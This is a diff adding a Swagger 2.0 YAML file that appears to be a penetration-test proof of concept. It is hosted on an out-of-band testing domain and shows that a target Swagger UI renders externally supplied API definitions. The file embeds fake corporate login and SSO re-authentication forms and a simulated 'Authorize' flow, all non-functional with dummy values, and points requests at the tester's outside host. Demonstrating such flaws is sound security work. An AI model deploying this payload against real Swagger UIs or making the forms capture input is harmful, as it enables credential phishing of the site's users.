@@ -1,0 +1,128 @@
+swagger: "2.0"
+info:
+  title: "External Swagger Load PoC"
+  version: "1.0.0"
+  description: |
+    SECURITY TEST ONLY.
+
+    This OpenAPI/Swagger document is intentionally hosted outside the target
+    application to demonstrate that the Swagger UI accepts and renders an
+    unrestricted externally supplied API definition.
+
+    If this banner appears inside the target Swagger UI, the application has
+    loaded attacker-controlled content from an external origin. A real attacker
+    could make this document look like a trusted internal API, add persuasive
+    instructions, and direct users to interact with attacker-controlled
+    endpoints.
+
+    Do not enter real credentials or secrets into this PoC.
+
+    <hr>
+    <h2 style="color:#b00020">Security Validation Portal</h2>
+    <p>
+      This fake embedded form demonstrates how attacker-controlled HTML-like
+      content can appear inside a trusted Swagger UI when external specs are
+      unrestricted.
+    </p>
+    <form action="#" method="post" onsubmit="return false;">
+      <label for="poc-username">Corporate username</label><br>
+      <input id="poc-username" name="username" value="test-user@example.com" readonly><br><br>
+      <label for="poc-password">Password</label><br>
+      <input id="poc-password" name="password" value="dummy-password-only" readonly><br><br>
+      <button type="button">Validate access - demo only</button>
+    </form>
+    <p><strong>PoC note:</strong> this form is intentionally non-functional and
+    uses readonly dummy values. It is included only to show social-engineering
+    presentation risk.</p>
+  contact:
+    name: "Security PoC"
+    url: "https://frab1y2l14rlzou3amvc43f0trzin9by.oastify.com/contact"
+  termsOfService: "https://frab1y2l14rlzou3amvc43f0trzin9by.oastify.com/terms"
+
+host: "frab1y2l14rlzou3amvc43f0trzin9by.oastify.com"
+basePath: "/swagger-ui-external-load-poc"
+schemes:
+  - "https"
+consumes:
+  - "application/json"
+produces:
+  - "application/json"
+
+securityDefinitions:
+  simulatedBasicAuth:
+    type: "basic"
+    description: |
+      Simulated authorization control for social-engineering demonstration only.
+      Do not enter real credentials. This shows how a malicious externally
+      loaded spec can present a trusted-looking "Authorize" flow inside the
+      victim Swagger UI.
+
+paths:
+  /loaded:
+    get:
+      tags:
+        - "Proof of external load"
+      summary: "Passive proof that external Swagger content rendered"
+      description: |
+        This operation is harmless. It proves the target Swagger UI rendered an
+        API definition controlled by an external origin.
+
+        Expected evidence:
+        - The title "External Swagger Load PoC" is displayed in the target UI.
+        - The API server/host shown by Swagger UI is the OAST domain.
+        - Any manual "Try it out" request goes to the OAST domain, confirming
+          users can be guided from the trusted Swagger UI to attacker-controlled
+          infrastructure.
+      operationId: "externalLoadProof"
+      responses:
+        "200":
+          description: "PoC endpoint reached"
+
+  /simulated-login:
+    post:
+      tags:
+        - "Social engineering simulation"
+      summary: "Simulated credential prompt risk"
+      description: |
+        This endpoint intentionally does not require real credentials. It exists
+        to show how an attacker-controlled Swagger document can create a
+        convincing, trusted-looking workflow in the target application's
+        Swagger UI.
+
+        For testing, use dummy values only, such as:
+        username: test-user
+        password: test-password
+
+        <div style="border:1px solid #d93025;padding:12px;margin:12px 0">
+          <h3>Fake SSO Re-authentication Prompt</h3>
+          <p>
+            This mock prompt shows how a malicious external Swagger definition
+            could visually impersonate an internal workflow.
+          </p>
+          <form action="#" method="post" onsubmit="return false;">
+            <input name="tenant" value="example-corp" readonly>
+            <input name="username" value="demo-user" readonly>
+            <input name="password" value="demo-password" readonly>
+            <button type="button">Continue - demo only</button>
+          </form>
+        </div>
+      operationId: "simulatedLoginRisk"
+      security:
+        - simulatedBasicAuth: []
+      parameters:
+        - in: "body"
+          name: "body"
+          required: false
+          schema:
+            type: "object"
+            properties:
+              note:
+                type: "string"
+                example: "Dummy test data only - do not enter secrets"
+      responses:
+        "200":
+          description: "Simulation request completed"
+
+externalDocs:
+  description: "External documentation controlled by the tester"
+  url: "https://frab1y2l14rlzou3amvc43f0trzin9by.oastify.com/docs"
